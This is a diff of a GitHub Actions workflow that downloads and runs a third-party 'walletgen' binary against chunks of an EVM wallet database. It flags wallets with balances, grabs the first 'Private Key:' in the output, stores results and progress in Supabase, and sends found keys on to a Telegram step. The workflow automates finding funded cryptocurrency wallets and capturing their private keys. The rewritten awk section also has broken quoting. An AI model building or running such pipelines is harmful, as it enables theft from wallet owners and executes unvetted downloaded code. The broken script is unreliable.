@@ -12,7 +12,7 @@ jobs:
       - name: Install expect
         run: |
           sudo apt-get update
-          sudo apt-get install -y expect jq
+          sudo apt-get install -y expect jq curl
 
       - name: Download release + database file
         run: |
@@ -21,19 +21,31 @@ jobs:
           curl -L https://raw.githubusercontent.com/mnadamod/walletgens/main/evm_database.txt -o evm_database.txt
           mv evm_database.txt walletgen/
 
-      - name: Verify database file
+      - name: Get last index from Supabase
+        id: index
         run: |
-          echo "=== Database line count ==="
-          wc -l walletgen/evm_database.txt
+          last=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/progress?select=last_index" \
+            -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" | jq -r '.[0].last_index')
+          if [ "$last" = "null" ] || [ -z "$last" ]; then
+            last=0
+          fi
+          echo "last_index=$last" >> $GITHUB_OUTPUT
 
-      - name: Run checker with expect
+      - name: Prepare chunk of database
+        run: |
+          start=${{ steps.index.outputs.last_index }}
+          end=$((start + 100000))
+          echo "Extracting lines $start to $end"
+          sed -n "$start,$end p" walletgen/evm_database.txt > walletgen/evm_chunk.txt
+
+      - name: Run checker with expect on chunk
         working-directory: walletgen
         run: |
           chmod +x walletgen
           echo "=== Starting walletgen with expect ==="
           expect <<'EOF' | tee result.txt
           log_user 1
-          spawn ./walletgen
+          spawn ./walletgen evm_chunk.txt
           expect {
             "select an action using the key:" { send "6\r" }
           }
@@ -41,7 +53,6 @@ jobs:
           EOF
           code=$?
           echo "=== walletgen exit code: $code ==="
-          echo "=== Checker Output ==="
           cat result.txt
 
       - name: Process results and update Supabase
@@ -51,42 +62,37 @@ jobs:
           active_addr=""
           active_priv=""
 
-          # Loop through each address/balance pair
-          grep -A1 "address:" result.txt | while read -r line; do
-            if [[ $line == address* ]]; then
-              addr=$(echo "$line" | awk '{print $2}')
-            fi
-            if [[ $line == balance* ]]; then
-              bal=$(echo "$line" | awk '{print $2}')
-              status="empty"
-              if [[ "$bal" != "(empty)" && "$bal" != "0.000000$" ]]; then
-                status="active"
-              fi
+          awk '/address:/ {addr=$2} /balance:/ {bal=$2;
+            status="empty";
+            if (bal!="(empty)" && bal!="0.000000$") status="active";
+            # Insert into Supabase if not present
+            cmd="curl -s \"${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq."addr"\" -H \"apikey: ${{ secrets.SUPABASE_KEY }}\" -H \"Authorization: Bearer ${{ secrets.SUPABASE_KEY }}\""
+            cmd | getline exists
+            close(cmd)
+            if (exists=="[]") {
+              system("curl -s \"${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets\" -H \"apikey: ${{ secrets.SUPABASE_KEY }}\" -H \"Authorization: Bearer ${{ secrets.SUPABASE_KEY }}\" -H \"Content-Type: application/json\" -d \"{\\\"address\\\":\\\""addr"\\\",\\\"status\\\":\\\""status"\\\"}\"")
+            }
+            if (status=="active") {
+              found="true"
+              active_addr=addr
+              cmd2="grep \\\"Private Key:\\\" result.txt | head -n1 | awk \\'{print $3}\\'"
+              cmd2 | getline active_priv
+              close(cmd2)
+            }
+          } END {
+            print \"found=\"found >> ENVIRON[\"GITHUB_OUTPUT\"]
+            print \"address=\"active_addr >> ENVIRON[\"GITHUB_OUTPUT\"]
+            print \"private=\"active_priv >> ENVIRON[\"GITHUB_OUTPUT\"]
+          }' result.txt
 
-              # Check if already in Supabase
-              exists=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq.${addr}" \
-                -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}")
-
-              if [ "$exists" = "[]" ]; then
-                # Insert new wallet with status
-                curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
-                  -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
-                  -H "Content-Type: application/json" \
-                  -d "{\"address\":\"$addr\",\"status\":\"$status\"}"
-              fi
-
-              if [ "$status" = "active" ]; then
-                found=true
-                active_addr=$addr
-                # Private key parsing if walletgen prints it
-                active_priv=$(grep "Private Key:" result.txt | head -n1 | awk '{print $3}')
-              fi
-            fi
-          done
-
-          echo "found=$found" >> $GITHUB_OUTPUT
-          echo "address=$active_addr" >> $GITHUB_OUTPUT
-          echo "private=$active_priv" >> $GITHUB_OUTPUT
+      - name: Update progress index
+        run: |
+          new_index=$(( ${{ steps.index.outputs.last_index }} + 100000 ))
+          curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/progress" \
+            -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"id\":1,\"last_index\":$new_index}" \
+            -X PATCH
 
       - name: Notify Telegram
         if: steps.process.outputs.found == 'true'
